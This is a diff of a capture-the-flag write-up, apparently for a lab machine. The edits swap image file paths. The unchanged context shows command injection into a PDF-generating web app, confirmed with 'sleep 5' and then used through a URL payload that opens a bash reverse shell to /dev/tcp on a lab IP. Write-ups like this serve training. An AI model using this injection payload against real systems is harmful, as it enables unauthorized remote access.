@@ -46,7 +46,7 @@ Searching on google we find this web with a vulnerability:
 
 So we try with the same command `sleep 5`
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
 
 And after 5 seconds, we obtain the prompt with the PDF :clap:
 
@@ -60,7 +60,7 @@ On the web(using a bash reverse shell):
 http://10.10.16.81:8888/?name={'%20`bash -c 'exec bash -i &>/dev/tcp/10.10.16.81/4444 <&1'`'}
 ```
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now we are on the system as ruby.
 
